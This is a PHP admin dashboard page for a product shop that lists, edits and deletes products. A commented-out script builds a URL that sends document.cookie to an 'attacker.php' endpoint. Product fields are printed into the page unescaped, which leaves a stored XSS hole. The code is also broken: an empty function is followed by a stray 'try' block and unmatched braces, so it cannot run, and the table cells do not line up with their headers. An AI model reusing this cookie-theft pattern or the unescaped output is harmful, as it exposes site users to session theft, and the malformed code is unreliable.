<?php
session_start();

if (isset($_SESSION['adminID'])) {
	if (isset($_POST['btnEdit'])) {
		$_SESSION['sesProductId'] = $_POST['btnEdit'];
		header('location: ./editProduct.php');
	}
	if (isset($_POST['btnDel'])) {
		require_once("connectionDB.php");
		$sql = "DELETE FROM Product WHERE productId = ?";
		$stmt = $conn->prepare($sql);
		$stmt->bind_param('i', $productId);
		$productId = $_POST['btnDel'];
		$stmt->execute();
		if ($stmt)
			echo "<script>alert('Record Deleted Successfully!');window.location.replace('./Dashboard.php');</script>";
		else
			echo "<script>alert('Record not Deleted!');</script>";
	}
?>

	<!DOCTYPE html>
	<html>

	<head>
		<meta charset="UTF-8">
		<title>ACE GEAR ADMIN</title>
		<!-- <link rel="stylesheet" href="../assets/style.css"> -->
		<link rel="stylesheet" href="../assets/bootstrap/css/bootstrap.css">
		<style>
			h1>a {
				font-size: 25px;
				float: right;
				padding-right: 40px;
				padding-top: 15px;
			}
		</style>
	</head>

	<body>
		<SCRIPT type="text/javascript">
			// var adr = '../attacker.php?victim_cookie=' + escape(document.cookie);
			// alert(adr);
			// alert(document.cookie);
		</SCRIPT>
		<h1>
			&emsp;ACE GEAR - Dashboard
			<a href="./adminLogout.php">Logout</a>
			<a href="./addProduct.php">Add Product</a>
		</h1>
		<hr>
		<form method="POST">
			<?php
  require_once("connectionDB.php");
function fetchProducts() {
}
    global $db;

    try {
         // database connection code 
			require_once("connectionDB.php");
			$sql = "SELECT * FROM Product";
			$result = mysqli_query($conn, $sql);

			if ($result->num_rows < 1)
				echo "<h4 align='center'>Product not exist!</h4>";
			else {
				$output = "";
				$output = " <table align='center' cellpadding='20' cellspacing='0'>
						<tr>
							<th>Image</th>
							<th>Product Id</th>
							<th>Product Name</th>
							<th>Price</th>
							<th>Product Description</th>
							<th>Colour</th>
                                                        <th>Size</th>
              				                <th>Category</th>
				                        <th>Action</th>
						</tr>";
				while ($row = mysqli_fetch_array($result)) {
					$output .= "<tr>
									<td><img src='../images/" . $row['Image'] . "' width='150px' height='150px'></td>
									<td>" . $row['productId'] . "</td>
									<td>" . $row['product_name'] . "</td>
                  					<td>" . $row['price'] . "</td>
                  					<td>" . $row['description'] . "</td>
									<td>" . $row['categoryID'] . "</td>
									<td>" . $row['colour'] . "</td>
                  					<td>" . $row['size'] . "</td>
									<td>" . $row['stock'] . "</td>
									<td>
										<button type='submit' name='btnEdit' value='" . $row['productId'] . "'>Edit</button>&ensp;
										<button type='submit' name='btnDel' value='" . $row['productId'] . "'>Delete</button>
									</td>
								</tr>";
				}
				$output .= "</table>";
				echo $output;
			}
			?>
		</form>
	</body>

	</html>

<?php
}
} else {
	echo "Please <a href='./adminLogin.php'>Login</a> first!";
}
?>
